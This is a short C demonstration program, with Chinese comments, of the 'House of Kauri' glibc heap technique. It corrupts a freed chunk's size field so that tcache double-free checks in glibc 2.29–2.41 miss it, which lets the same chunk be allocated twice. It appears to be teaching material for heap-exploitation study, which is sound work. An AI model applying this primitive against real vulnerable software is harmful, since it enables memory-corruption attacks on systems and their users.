/*
 * 手法：House of Kauri，适用于 glibc 2.26～2.41，x86-64。
 *
 * 漏洞模型：victim 第一次 free 后仍可改它的 chunk size。
 * 先让它进入 0x20 tcache，再把 size 从 0x21 改为 0x31，第二次 free 会进入
 * 0x30 tcache。2.29～2.41 的 key 验证只扫描“新 size 对应的 bin”，看不到
 * victim 仍在旧 bin；2.42 改为扫描所有 bins，本程序会正确 abort。
 */
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    setbuf(stdout, NULL);

    uint64_t *victim = malloc(0x18);        /* 实际 chunk size 0x20 */
    void *guard = malloc(0x38);             /* 只为保持物理布局稳定 */
    (void)guard;

    free(victim);                           /* victim 进入 tc_idx=0 */

    /*
     * 漏洞触发点：用户指针前 8 字节是 mchunk_size。
     * 不要在真实题目中忘记：需要溢出/UAF 才能完成这次写。
     */
    victim[-1] = 0x31;
    free(victim);                           /* 同一地址又进入 tc_idx=1 */

    void *from_30 = malloc(0x28);           /* 从 0x30 tcache 取 victim */
    void *from_20 = malloc(0x18);           /* 从 0x20 tcache 再取 victim */

    assert(from_30 == victim);
    assert(from_20 == victim);
    assert(from_30 == from_20);
    puts("[+] Kauri：跨 bin 重复分配成功");
    return 0;
}
